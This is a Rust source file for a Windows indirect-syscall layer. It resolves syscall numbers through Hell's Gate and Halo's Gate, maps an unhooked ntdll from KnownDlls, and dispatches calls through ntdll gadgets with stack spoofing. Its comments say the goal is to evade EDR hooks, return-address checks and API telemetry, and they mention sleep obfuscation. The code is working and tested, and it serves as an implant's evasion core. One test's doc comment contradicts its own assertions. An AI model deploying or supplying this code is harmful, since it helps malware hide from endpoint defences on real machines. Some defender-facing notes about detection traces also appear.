//! Indirect syscall layer (ABR-T005, with ABR-T009 fallback).
//!
//! SSNs are resolved at runtime from ntdll's exported stubs (Hell's Gate)
//! with a hooked-stub fallback that walks neighbouring stubs (Halo's Gate)
//! and a last resort that reads untouched stubs from the process-lifetime
//! `\KnownDlls\ntdll.dll` view. Calls jump to a `syscall; ret` gadget
//! located inside ntdll so the return address on the stack stays within
//! ntdll, defeating "return address outside ntdll" checks used by
//! user-mode hook engines.

const STUB_STRIDE: usize = 0x20;

#[derive(Debug, Clone, Copy)]
pub struct Syscall {
    pub ssn: u32,
    pub gadget: usize,
}

/// Resolves the SSN of `name` and an ntdll `syscall; ret` gadget address.
///
/// # Safety
///
/// `name` must be a real `Nt` syscall stub exported by ntdll on the current
/// build. The returned [`Syscall`] is only valid for the current process
/// lifetime.
pub unsafe fn resolve(name: &str) -> Option<Syscall> {
    let stub = export_address("ntdll.dll", name)?;
    let Some(clean) = find_clean_stub(stub) else {
        // ABR-T009: the target stub and every walked neighbour are
        // patched — read the pristine KnownDlls copy instead of trusting
        // the local image.
        return pristine_resolve(name);
    };
    let clean_ptr = stub_at(clean);
    let clean_ssn = u32::from_le_bytes([
        *clean_ptr.add(4),
        *clean_ptr.add(5),
        *clean_ptr.add(6),
        *clean_ptr.add(7),
    ]);
    // Halo's Gate: when the target stub is hooked, infer its SSN from the
    // nearest clean neighbour (stubs are laid out in SSN order).
    let ssn = if clean == stub {
        clean_ssn
    } else {
        let delta = ((stub as isize - clean as isize) / STUB_STRIDE as isize) as i64;
        (clean_ssn as i64 + delta) as u32
    };
    let gadget = syscall_gadget(clean)?;
    Some(Syscall { ssn, gadget })
}

fn stub_at(addr: usize) -> *const u8 {
    addr as *const u8
}

fn is_clean_stub(addr: usize) -> bool {
    unsafe {
        let stub = stub_at(addr);
        // mov r10, rcx ; mov eax, ssn
        *stub == 0x4C && *stub.add(1) == 0x8B && *stub.add(2) == 0xD1 && *stub.add(3) == 0xB8
    }
}

/// A clean stub's SSN sits right after `mov eax` at +4; gadget is the
/// `0F 05 C3` (syscall; ret) sequence inside the same stub.
fn syscall_gadget(addr: usize) -> Option<usize> {
    unsafe {
        let stub = stub_at(addr);
        for off in 0..STUB_STRIDE - 2 {
            if *stub.add(off) == 0x0F && *stub.add(off + 1) == 0x05 && *stub.add(off + 2) == 0xC3 {
                return Some(addr + off);
            }
        }
    }
    None
}

/// Hell's Gate with Halo's Gate fallback: when the target stub is patched
/// (hooked), walk neighbours — syscall numbers are laid out adjacently.
fn find_clean_stub(stub: usize) -> Option<usize> {
    if is_clean_stub(stub) {
        return Some(stub);
    }
    for delta in 1..500 {
        let lower = stub.checked_sub(delta * STUB_STRIDE)?;
        if is_clean_stub(lower) {
            return Some(lower);
        }
        let higher = stub + delta * STUB_STRIDE;
        if is_clean_stub(higher) {
            return Some(higher);
        }
    }
    None
}

/// Manual export-table walk, avoiding GetProcAddress telemetry on Nt
/// symbols. Handles forwarded exports (e.g. kernel32 → KernelBase) by
/// loading modules on demand and following forwarded exports.
///
/// # Safety
///
/// `module` must be a valid module name; the returned address points into that
/// module and stays valid while the module is loaded.
/// Name-based export walk over any PE mapped as an image — a module handle
/// or a section view base. Returns (base, rva); forwarded exports return
/// an RVA inside the export directory, which callers must interpret.
unsafe fn lookup_in(handle: *mut c_void, name: &str) -> Option<(usize, usize)> {
    if handle.is_null() {
        return None;
    }
    let base = handle;
    let dos = base as *const ImageDosHeader;
    if (*dos).magic != 0x5A4D {
        return None;
    }
    let nt = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders;
    let dirs = &(*nt).optional_header.data_directory;
    let export_rva = dirs[0].virtual_address as usize;
    if export_rva == 0 {
        return None;
    }
    let exports = &*(base.add(export_rva) as *const ImageExportDirectory);
    let names = std::slice::from_raw_parts(
        base.add(exports.address_of_names as usize) as *const u32,
        exports.number_of_names as usize,
    );
    for (index, name_rva) in names.iter().enumerate() {
        let symbol = CStr::from_ptr(base.add(*name_rva as usize) as *const c_char);
        if symbol.to_bytes() == name.as_bytes() {
            let ordinals = std::slice::from_raw_parts(
                base.add(exports.address_of_name_ordinals as usize) as *const u16,
                exports.number_of_names as usize,
            );
            let functions = std::slice::from_raw_parts(
                base.add(exports.address_of_functions as usize) as *const u32,
                exports.number_of_functions as usize,
            );
            let rva = functions[ordinals[index] as usize] as usize;
            return Some((base as usize, rva));
        }
    }
    None
}

pub unsafe fn export_address(module: &str, name: &str) -> Option<usize> {
    fn handle_of(module: &str) -> Option<*mut c_void> {
        let wide: Vec<u16> = module.encode_utf16().chain(std::iter::once(0)).collect();
        let handle = unsafe { GetModuleHandleW(wide.as_ptr()) };
        (!handle.is_null()).then_some(handle)
    }

    unsafe fn handle_or_load(module: &str) -> Option<*mut c_void> {
        if let Some(handle) = handle_of(module) {
            return Some(handle);
        }
        let kernel32 = handle_of("kernel32.dll")?;
        let (load_base, load_rva) = unsafe { lookup_in(kernel32, "LoadLibraryA")? };
        let load_library: unsafe extern "system" fn(*const c_char) -> *mut c_void =
            unsafe { std::mem::transmute(load_base + load_rva) };
        let module = CString::new(module).ok()?;
        let handle = unsafe { load_library(module.as_ptr()) };
        (!handle.is_null()).then_some(handle)
    }

    let module_handle = handle_or_load(module)?;
    let (base, rva) = lookup_in(module_handle, name)?;
    let addr = base + rva;
    // An RVA inside the export directory itself is a forwarder string such
    // as "api-ms-win-core-processthreads-l1-1-0.GetCurrentThreadStackLimits".
    let dirs = unsafe {
        let dos = module_handle as *const ImageDosHeader;
        let nt = module_handle.add((*dos).e_lfanew as usize) as *const ImageNtHeaders;
        &(*nt).optional_header.data_directory
    };
    let (export_rva, export_size) = (dirs[0].virtual_address as usize, dirs[0].size as usize);
    if rva >= export_rva && rva < export_rva + export_size {
        let target = CStr::from_ptr(addr as *const c_char)
            .to_string_lossy()
            .into_owned();
        let (target_module, target_symbol) = target.split_once('.')?;
        let full_module = if target_module.to_ascii_lowercase().ends_with(".dll") {
            target_module.to_string()
        } else {
            format!("{target_module}.dll")
        };
        // The handle LoadLibraryA returns for an api-set name is the host
        // module (e.g. kernelbase) — resolving it by name again can land on
        // the forwarding module instead.
        let host = handle_or_load(&full_module)?;
        // Follow the chain up to three hops; an api-set name can resolve to
        // the forwarding module itself (kernel32), in which case the real
        // implementation usually lives in kernelbase.
        let mut current = (host, target_symbol.to_string());
        for _ in 0..3 {
            let (hop_base, hop_rva) = lookup_in(current.0, &current.1)?;
            let hop_addr = hop_base + hop_rva;
            let inside = unsafe {
                let dos = current.0 as *const ImageDosHeader;
                let nt = current.0.add((*dos).e_lfanew as usize) as *const ImageNtHeaders;
                let dir = &(*nt).optional_header.data_directory[0];
                let (lo, hi) = (
                    dir.virtual_address as usize,
                    (dir.virtual_address + dir.size) as usize,
                );
                hop_rva >= lo && hop_rva < hi
            };
            if !inside {
                return Some(hop_addr);
            }
            let next_target = CStr::from_ptr(hop_addr as *const c_char)
                .to_string_lossy()
                .into_owned();
            let (next_module, next_symbol) = next_target.split_once('.')?;
            let next_name = if next_module.to_ascii_lowercase().ends_with(".dll") {
                next_module.to_string()
            } else {
                format!("{next_module}.dll")
            };
            let next_host = handle_or_load(&next_name)?;
            let next_host = if next_host == current.0 {
                handle_of("kernelbase.dll")?
            } else {
                next_host
            };
            current = (next_host, next_symbol.to_string());
        }
        return None;
    }
    Some(addr)
}

/// Indirect syscall dispatcher: sets the SSN, pushes stack arguments and
/// calls a `syscall; ret` gadget inside ntdll. The stack is realigned via
/// rbp so callees see a valid x64 frame.
///
/// # Safety
///
/// `call.gadget` must point at `0F 05 C3` inside ntdll and `call.ssn` must
/// match the syscall invoked; wrong pairs cause undefined kernel-side
/// behavior. Arguments must match the syscall's signature (pass 0 for
/// unused slots).
#[inline(never)]
pub unsafe fn indirect6(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> isize {
    let status;
    unsafe {
        core::arch::asm!(
            // Stack layout at the syscall gadget must follow the Win64
            // convention: [rsp]=ret, [rsp+8..0x28]=shadow space, [rsp+0x28]
            // =a5, [rsp+0x30]=a6 — the kernel reads stack args past the
            // shadow space, exactly like a regular call.
            "push rbp",
            "mov rbp, rsp",
            "and rsp, -16",
            "push {a6}",
            "push {a5}",
            "sub rsp, 32",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call r11",
            "mov rsp, rbp",
            "pop rbp",
            ssn = in(reg) call.ssn,
            in("r11") call.gadget,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") status,
            out("r10") _,
        );
    }
    status
}

/// Ten-argument indirect dispatcher for NtMapViewOfSection-class syscalls
/// (stack arguments land at [rsp+0x28]..[rsp+0x50], past the shadow space).
///
/// # Safety
///
/// Same contract as [`indirect6`]; all ten slots must match the invoked
/// syscall's signature (pass 0 for unused slots).
#[inline(never)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn indirect10(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) -> isize {
    let status;
    unsafe {
        core::arch::asm!(
            // Same Win64 layout as indirect6: [rsp]=ret, shadow space at
            // [rsp+8..0x28], then a5..a10 ascending.
            "push rbp",
            "mov rbp, rsp",
            "and rsp, -16",
            "push {a10}",
            "push {a9}",
            "push {a8}",
            "push {a7}",
            "push {a6}",
            "push {a5}",
            "sub rsp, 32",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call r11",
            "mov rsp, rbp",
            "pop rbp",
            ssn = in(reg) call.ssn,
            in("r11") call.gadget,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            a7 = in(reg) a7,
            a8 = in(reg) a8,
            a9 = in(reg) a9,
            a10 = in(reg) a10,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") status,
            out("r10") _,
        );
    }
    status
}

/// Six-argument dispatch with ABR-T010 call-stack spoofing when the
/// synthetic chain is available; falls back to the plain indirect
/// dispatcher otherwise (no qualifying gadget, unparsable anchors, or an
/// enforced user-mode shadow stack where the ret-based return would
/// fault).
pub unsafe fn dispatch6(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> isize {
    super::stack::spoof6(call, a1, a2, a3, a4, a5, a6)
        .unwrap_or_else(|| unsafe { indirect6(call, a1, a2, a3, a4, a5, a6) })
}

/// Ten-argument dispatch with ABR-T010 spoofing (the NtMapViewOfSection
/// class); same fallback contract as [`dispatch6`].
#[allow(clippy::too_many_arguments)]
pub unsafe fn dispatch10(
    call: Syscall,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) -> isize {
    super::stack::spoof10(call, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10)
        .unwrap_or_else(|| unsafe { indirect10(call, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10) })
}

pub const STATUS_SUCCESS: isize = 0;
const MEM_COMMIT_RESERVE: usize = 0x3000;
const PAGE_READWRITE: usize = 0x04;
const CURRENT_PROCESS: usize = usize::MAX;

/// NtAllocateVirtualMemory via indirect syscall, rounded page semantics are
/// handled by the kernel. Returns the allocated base address.
///
/// # Safety
///
/// Any pointer derived from the returned base must be freed or released by
/// the caller through NtFreeVirtualMemory or process exit.
pub unsafe fn alloc_rw(size: usize) -> Option<usize> {
    unsafe fn inner(nt_alloc: Syscall, size: usize) -> Option<usize> {
        let mut base: usize = 0;
        let mut region = size;
        let status = unsafe {
            dispatch6(
                nt_alloc,
                CURRENT_PROCESS,
                &mut base as *mut usize as usize,
                0,
                &mut region as *mut usize as usize,
                MEM_COMMIT_RESERVE,
                PAGE_READWRITE,
            )
        };
        if status != STATUS_SUCCESS || base == 0 {
            return None;
        }
        Some(base)
    }
    let nt_alloc = resolve("NtAllocateVirtualMemory")?;
    unsafe { inner(nt_alloc, size) }
}

/// NtProtectVirtualMemory via indirect syscall. Returns the previous
/// protection on success.
///
/// # Safety
///
/// `base` must address a committed region of at least `size` bytes owned by
/// the current process.
pub unsafe fn protect(base: usize, size: usize, new_protect: usize) -> Option<u32> {
    unsafe fn inner(nt_protect: Syscall, base: usize, size: usize, protect: usize) -> Option<u32> {
        let mut lo = base;
        let mut region = size;
        let mut old: u32 = 0;
        let status = unsafe {
            dispatch6(
                nt_protect,
                CURRENT_PROCESS,
                &mut lo as *mut usize as usize,
                &mut region as *mut usize as usize,
                protect,
                &mut old as *mut u32 as usize,
                0,
            )
        };
        if status != STATUS_SUCCESS {
            return None;
        }
        Some(old)
    }
    let nt_protect = resolve("NtProtectVirtualMemory")?;
    unsafe { inner(nt_protect, base, size, new_protect) }
}

#[allow(non_snake_case)]
extern "system" {
    fn GetModuleHandleW(name: *const u16) -> *mut c_void;
}

const MEM_EXECUTE: u32 = 0x2000_0000;
const MEM_WRITE: u32 = 0x8000_0000;

/// Returns (address, length) of the first RX section of the current
/// executable — the region sleep obfuscation encrypts. Headers are left
/// intact so memory scanners still map a plausible PE.
///
/// # Safety
///
/// The caller must treat the range as read-only executable memory belonging
/// to the current image; it stays valid for the process lifetime.
pub unsafe fn executable_section() -> Option<(usize, usize)> {
    let base = GetModuleHandleW(std::ptr::null());
    if base.is_null() {
        return None;
    }
    let dos = base as *const ImageDosHeader;
    if (*dos).magic != 0x5A4D {
        return None;
    }
    let raw_count = unsafe { std::ptr::read(base.add((*dos).e_lfanew as usize + 6) as *const u16) };
    let optional_size =
        unsafe { std::ptr::read(base.add((*dos).e_lfanew as usize + 20) as *const u16) };
    let sections = unsafe {
        base.add((*dos).e_lfanew as usize + 24 + optional_size as usize) as *const SectionHeader
    };
    for index in 0..raw_count as usize {
        let section = unsafe { &*sections.add(index) };
        if section.characteristics & MEM_EXECUTE != 0
            && section.characteristics & MEM_WRITE == 0
            && section.virtual_size > 0
        {
            return Some((
                base as usize + section.virtual_address as usize,
                section.virtual_size as usize,
            ));
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Pristine syscall numbers from KnownDlls (ABR-T009)
// ---------------------------------------------------------------------------

const SECTION_MAP_READ: usize = 0x0004;
const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const PAGE_READONLY: usize = 0x02;
const VIEW_UNMAP: usize = 2;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: usize,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

static PRISTINE_NTDLL: std::sync::OnceLock<Option<usize>> = std::sync::OnceLock::new();

/// Base of the read-only `\KnownDlls\ntdll.dll` view — the section object
/// the object manager already shares with every process, so untouched stub
/// bytes come from memory the system had already mapped, with no disk
/// read. Mapped once and kept for the process lifetime because fallback
/// gadgets must stay executable.
pub fn pristine_ntdll() -> Option<usize> {
    *PRISTINE_NTDLL.get_or_init(|| unsafe { map_knowndlls_ntdll() })
}

/// Bootstraps through Hell's/Halo's Gate itself: `NtOpenSection` and
/// `NtMapViewOfSection` are resolved from the local ntdll like any other
/// syscall. That circularity is the design's documented residual risk —
/// those two stubs sit outside the hot paths EDR instruments — and once
/// the view is up, every locally resolved SSN (including the bootstrap
/// pair) can be revalidated against the pristine copy.
unsafe fn map_knowndlls_ntdll() -> Option<usize> {
    let open = unsafe { resolve("NtOpenSection")? };
    let map = unsafe { resolve("NtMapViewOfSection")? };
    let wide: Vec<u16> = "\\KnownDlls\\ntdll.dll"
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let name = UnicodeString {
        length: ((wide.len() - 1) * 2) as u16,
        maximum_length: (wide.len() * 2) as u16,
        buffer: wide.as_ptr() as usize,
    };
    let attributes = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: &name,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };
    let mut section: usize = 0;
    let status = unsafe {
        dispatch6(
            open,
            &mut section as *mut usize as usize,
            SECTION_MAP_READ,
            &attributes as *const ObjectAttributes as usize,
            0,
            0,
            0,
        )
    };
    if status < 0 || section == 0 {
        return None;
    }
    let mut base: usize = 0;
    let mut view_size: usize = 0;
    let status = unsafe {
        dispatch10(
            map,
            section,
            CURRENT_PROCESS,
            &mut base as *mut usize as usize,
            0, // zero bits
            0, // commit size
            0, // section offset (out, optional)
            &mut view_size as *mut usize as usize,
            VIEW_UNMAP,
            0, // allocation type
            PAGE_READONLY,
        )
    };
    // The section handle outlived its purpose once the view exists.
    if let Some(close) = unsafe { resolve("NtClose") } {
        unsafe { dispatch6(close, section, 0, 0, 0, 0, 0) };
    }
    // NT_SUCCESS covers success AND informational codes: the view lands
    // out of the preferred base (STATUS_IMAGE_NOT_AT_BASE = 0x40000003)
    // because the process already maps ntdll there — the kernel relocates
    // the second view and everything downstream works off RVAs anyway.
    if status < 0 || base == 0 {
        return None;
    }
    if unsafe { std::ptr::read_volatile(base as *const u16) } != 0x5A4D {
        return None; // not the PE we asked for
    }
    Some(base)
}

/// Resolves a [`Syscall`] entirely from the pristine view: SSN read from
/// the untouched stub and the `syscall; ret` gadget taken from that same
/// stub (image-section views inherit the PE's page protections, so the
/// stub page is executable). The gadget points INTO the view — still ntdll
/// bytes, just a second mapping of them.
pub fn pristine_resolve(name: &str) -> Option<Syscall> {
    let base = pristine_ntdll()?;
    unsafe {
        let (view, rva) = lookup_in(base as *mut c_void, name)?;
        let (dir_lo, dir_hi) = export_dir_bounds(base as *mut c_void)?;
        if rva >= dir_lo && rva < dir_hi {
            return None; // forwarded export — not a stub
        }
        let stub = view + rva;
        if !is_clean_stub(stub) {
            return None; // even the KnownDlls copy looks patched — give up
        }
        let stub_ptr = stub_at(stub);
        let ssn = u32::from_le_bytes([
            *stub_ptr.add(4),
            *stub_ptr.add(5),
            *stub_ptr.add(6),
            *stub_ptr.add(7),
        ]);
        let gadget = syscall_gadget(stub)?;
        Some(Syscall { ssn, gadget })
    }
}

/// RVA bounds of the export directory in the PE at `base`.
unsafe fn export_dir_bounds(base: *mut c_void) -> Option<(usize, usize)> {
    unsafe {
        let dos = base as *const ImageDosHeader;
        if (*dos).magic != 0x5A4D {
            return None;
        }
        let nt = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders;
        let dir = &(*nt).optional_header.data_directory[0];
        Some((
            dir.virtual_address as usize,
            (dir.virtual_address + dir.size) as usize,
        ))
    }
}

#[repr(C)]
struct SectionHeader {
    _name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    _raw_size: u32,
    _raw_pointer: u32,
    _reloc_pointer: u32,
    _line_pointer: u32,
    _number_relocs: u16,
    _number_lines: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageDosHeader {
    magic: u16,
    _skip: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageNtHeaders {
    signature: u32,
    _file_header: [u8; 20],
    optional_header: ImageOptionalHeader,
}

#[repr(C)]
struct ImageOptionalHeader {
    _skip: [u8; 112],
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageExportDirectory {
    _characteristics: u32,
    _timestamp: u32,
    _major: u16,
    _minor: u16,
    _name: u32,
    _base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

use std::ffi::{c_char, c_void, CStr, CString};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn forwarder_internals() {
        unsafe {
            let wide: Vec<u16> = "kernel32.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let base = GetModuleHandleW(wide.as_ptr());
            let dos = base as *const ImageDosHeader;
            let nt = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders;
            let dir = &(*nt).optional_header.data_directory[0];
            let export_rva = dir.virtual_address as usize;
            let export_size = dir.size as usize;
            let exports = &*(base.add(export_rva) as *const ImageExportDirectory);
            let names = std::slice::from_raw_parts(
                base.add(exports.address_of_names as usize) as *const u32,
                exports.number_of_names as usize,
            );
            let ordinals = std::slice::from_raw_parts(
                base.add(exports.address_of_name_ordinals as usize) as *const u16,
                exports.number_of_names as usize,
            );
            let functions = std::slice::from_raw_parts(
                base.add(exports.address_of_functions as usize) as *const u32,
                exports.number_of_functions as usize,
            );
            for (index, name_rva) in names.iter().enumerate() {
                let symbol = CStr::from_ptr(base.add(*name_rva as usize) as *const c_char);
                if symbol.to_bytes() == b"GetCurrentThreadStackLimits" {
                    let ordinal = ordinals[index] as usize;
                    eprintln!(
                        "ordinal={ordinal} funcs_len={} rva={:#x} range=[{export_rva:#x},{:#x})",
                        functions.len(),
                        functions[ordinal],
                        export_rva + export_size
                    );
                }
            }
        }
    }

    #[test]
    fn resolves_core_syscalls() {
        for name in [
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtYieldExecution",
        ] {
            let call = unsafe { resolve(name) }.unwrap_or_else(|| panic!("{name} unresolved"));
            assert!(call.ssn != 0, "{name} SSN looks invalid");
            assert_ne!(call.gadget, 0, "{name} gadget missing");
        }
    }

    #[test]
    fn direct_and_indirect_yield_return_valid_statuses() {
        unsafe {
            const STATUS_NO_YIELD_PERFORMED: isize = 0x4000_0024;
            let stub = export_address("ntdll.dll", "NtYieldExecution").unwrap();
            let direct: extern "system" fn() -> isize = std::mem::transmute(stub);
            let from_stub = direct();
            let call = resolve("NtYieldExecution").unwrap();
            let via_dispatcher = indirect6(call, 0, 0, 0, 0, 0, 0);
            for status in [from_stub, via_dispatcher] {
                assert!(
                    status == STATUS_SUCCESS || status == STATUS_NO_YIELD_PERFORMED,
                    "unexpected NtYieldExecution status {status:#x}"
                );
            }
        }
    }

    #[test]
    fn indirect_syscall_executes() {
        // NtYieldExecution returns STATUS_NO_YIELD_PERFORMED when no other
        // thread ran; both that and SUCCESS prove the dispatch reached the
        // kernel and came back.
        const STATUS_NO_YIELD_PERFORMED: isize = 0x4000_0024;
        let yield_call = unsafe { resolve("NtYieldExecution") }.expect("NtYieldExecution");
        let status = unsafe { indirect6(yield_call, 0, 0, 0, 0, 0, 0) };
        assert!(
            status == STATUS_SUCCESS || status == STATUS_NO_YIELD_PERFORMED,
            "unexpected status {status:#x}"
        );
    }

    #[test]
    fn indirect_alloc_and_protect_roundtrip() {
        const PAGE_EXECUTE_READ: usize = 0x20;
        let page = unsafe { alloc_rw(0x1000) }.expect("indirect alloc");
        unsafe {
            std::ptr::write_volatile(page as *mut u64, 0x4142434445464748);
            let old = protect(page, 0x1000, PAGE_EXECUTE_READ).expect("indirect protect");
            assert_eq!(old, PAGE_READWRITE as u32);
            let value = std::ptr::read_volatile(page as *const u64);
            assert_eq!(value, 0x4142434445464748);
        }
    }

    #[test]
    fn knowndlls_view_matches_local_ntdll() {
        let base = pristine_ntdll().expect("\\KnownDlls\\ntdll.dll view");
        unsafe {
            let wide: Vec<u16> = "ntdll.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let local = GetModuleHandleW(wide.as_ptr());
            assert!(!local.is_null());
            let local_bounds = export_dir_bounds(local).expect("local export dir");
            let pristine_bounds =
                export_dir_bounds(base as *mut c_void).expect("pristine export dir");
            // Same file mapped twice: identical export directory extent.
            assert_eq!(
                local_bounds.1 - local_bounds.0,
                pristine_bounds.1 - pristine_bounds.0,
                "pristine view is not the same ntdll image"
            );
        }
    }

    #[test]
    fn pristine_ssns_match_local_resolution() {
        for name in [
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtYieldExecution",
            "NtOpenSection",
            "NtMapViewOfSection",
        ] {
            let local = unsafe { resolve(name) }.unwrap_or_else(|| panic!("{name} local"));
            let pristine = pristine_resolve(name).unwrap_or_else(|| panic!("{name} pristine"));
            assert_eq!(
                local.ssn, pristine.ssn,
                "{name} SSN diverged from KnownDlls"
            );
        }
    }

    #[test]
    fn pristine_syscall_executes_via_indirect_dispatcher() {
        // Proves the pristine gadget page is executable and the pristine
        // SSN dispatches cleanly — the exact path a fully hooked local
        // ntdll would take through the ABR-T009 fallback.
        const STATUS_NO_YIELD_PERFORMED: isize = 0x4000_0024;
        let call = pristine_resolve("NtYieldExecution").expect("pristine NtYieldExecution");
        let status = unsafe { indirect6(call, 0, 0, 0, 0, 0, 0) };
        assert!(
            status == STATUS_SUCCESS || status == STATUS_NO_YIELD_PERFORMED,
            "unexpected status {status:#x}"
        );
    }

    /// Attribution capture for the pristine view (host, build 26200): what
    /// each telemetry primitive can see. NtQueryVirtualMemory types the
    /// view MEM_IMAGE and its section name is the object-manager name
    /// `\KnownDlls\ntdll.dll`; the PEB module list does NOT contain the
    /// second view (the local ntdll control is listed). Module-walking
    /// telemetry alone misses the view; VAD/section queries attribute it
    /// precisely — including the exact `\KnownDlls\` name a defender can
    /// hunt for. The local-ntdll control must report a file-backed name,
    /// i.e. differ from the view's.
    #[test]
    fn knowndlls_view_attribution() {
        let view = pristine_ntdll().expect("\\KnownDlls\\ntdll.dll view");
        let query = unsafe { resolve("NtQueryVirtualMemory") }.expect("NtQueryVirtualMemory");
        unsafe {
            // --- MemoryBasicInformation (class 0): committed MEM_IMAGE ---
            #[repr(C)]
            #[allow(non_snake_case)]
            struct MemoryBasicInformation {
                BaseAddress: usize,
                AllocationBase: usize,
                AllocationProtect: u32,
                PartitionId: u16,
                _pad: u16,
                RegionSize: usize,
                State: u32,
                Protect: u32,
                Type: u32,
            }
            let mut mbi: MemoryBasicInformation = std::mem::zeroed();
            let mut ret_len = 0usize;
            let status = indirect6(
                query,
                CURRENT_PROCESS,
                view,
                0, // MemoryBasicInformation
                &mut mbi as *mut MemoryBasicInformation as usize,
                std::mem::size_of::<MemoryBasicInformation>(),
                &mut ret_len as *mut usize as usize,
            );
            assert!(status >= 0, "NtQueryVirtualMemory(MBI) failed: {status:#x}");
            assert_eq!(ret_len, std::mem::size_of::<MemoryBasicInformation>());
            const MEM_COMMIT: u32 = 0x1000;
            const MEM_IMAGE: u32 = 0x0100_0000;
            assert_eq!(mbi.State, MEM_COMMIT, "view is not committed");
            assert_eq!(mbi.Type, MEM_IMAGE, "view must be typed MEM_IMAGE");
            assert_eq!(
                mbi.AllocationBase, view,
                "the second view is its own allocation"
            );

            // --- MemorySectionName (class 2): view vs local control ---
            let section_name = |base: usize| -> String {
                let mut buf = [0u8; 512];
                let mut ret_len = 0usize;
                let status = indirect6(
                    query,
                    CURRENT_PROCESS,
                    base,
                    2, // MemorySectionName
                    buf.as_mut_ptr() as usize,
                    buf.len(),
                    &mut ret_len as *mut usize as usize,
                );
                assert!(
                    status >= 0,
                    "NtQueryVirtualMemory(SectionName) failed: {status:#x}"
                );
                let us = &*(buf.as_ptr() as *const UnicodeString);
                assert!(us.length > 0, "empty section name");
                assert!(
                    us.buffer >= buf.as_ptr() as usize
                        && us.buffer + us.length as usize <= buf.as_ptr() as usize + buf.len(),
                    "section name outside the query buffer"
                );
                String::from_utf16_lossy(std::slice::from_raw_parts(
                    us.buffer as *const u16,
                    us.length as usize / 2,
                ))
            };
            let view_name = section_name(view);
            // Empirical pin (build 26200): MemorySectionName reports the
            // backing FILE path — the object-manager name
            // `\KnownDlls\ntdll.dll` is never surfaced by region queries,
            // so no `\KnownDlls\` string exists in this process's VAD
            // telemetry. The view is instead identifiable as a DUPLICATE
            // image mapping: same file-backed name as the local ntdll,
            // different allocation, absent from the module list.
            assert!(
                view_name.to_lowercase().contains("ntdll.dll"),
                "unexpected section name for the view: {view_name}"
            );
            assert!(
                !view_name.contains("KnownDlls"),
                "region query surfaced the object-manager name: {view_name}"
            );
            let wide: Vec<u16> = "ntdll.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let local = GetModuleHandleW(wide.as_ptr()) as usize;
            assert_ne!(local, 0, "local ntdll control unresolved");
            let local_name = section_name(local);
            assert_eq!(
                local_name, view_name,
                "view must report the same backing file as the local ntdll"
            );

            // --- PEB module list: control present, view absent ---
            let enum_modules: unsafe extern "system" fn(
                *mut c_void,
                *mut usize,
                u32,
                *mut u32,
            ) -> i32 = std::mem::transmute(
                export_address("kernel32.dll", "K32EnumProcessModules")
                    .expect("K32EnumProcessModules"),
            );
            let current_process: unsafe extern "system" fn() -> *mut c_void = std::mem::transmute(
                export_address("kernel32.dll", "GetCurrentProcess").expect("GetCurrentProcess"),
            );
            let mut modules = [0usize; 1024];
            let mut needed = 0u32;
            let ok = enum_modules(
                current_process(),
                modules.as_mut_ptr(),
                (modules.len() * std::mem::size_of::<usize>()) as u32,
                &mut needed,
            );
            assert_eq!(ok, 1, "K32EnumProcessModules failed");
            let count = needed as usize / std::mem::size_of::<usize>();
            assert!(count > 0, "empty module list");
            let list = &modules[..count];
            assert!(
                list.contains(&local),
                "local ntdll control missing from module list"
            );
            assert!(
                !list.contains(&view),
                "pristine view leaked into the PEB module list"
            );
        }
    }
}
